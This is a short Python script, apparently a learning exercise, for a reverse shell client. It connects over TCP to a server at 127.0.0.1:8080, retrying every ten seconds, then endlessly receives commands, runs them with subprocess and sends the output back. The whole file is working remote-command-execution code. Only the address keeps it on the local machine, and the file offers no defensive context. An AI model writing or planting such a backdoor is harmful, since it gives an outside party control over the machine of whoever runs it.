#!/python3 

# Client.

# import library *
import socket
import subprocess
import time
# connetion creation (use ipv4 and Tcp)
Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[+] trying to connect to server...")
while True:
    time.sleep(10)
    try:
        # Servre ip and port (bind)
        Connection.connect(("127.0.0.1", 8080))
        # connect to server
        break
    except ConnectionRefusedError:
        print("[!] Connection failed, retrying...")
        pass

print("[+] Connecting to server...")
# while loop rverse and send
while True:
    # Receive data from the server
    RecvData = Connection.recv(1024).decode()
    # output data
    ClintOutput = subprocess.getoutput(RecvData)
    # send data to server
    Connection.send(ClintOutput.encode())

# close connection
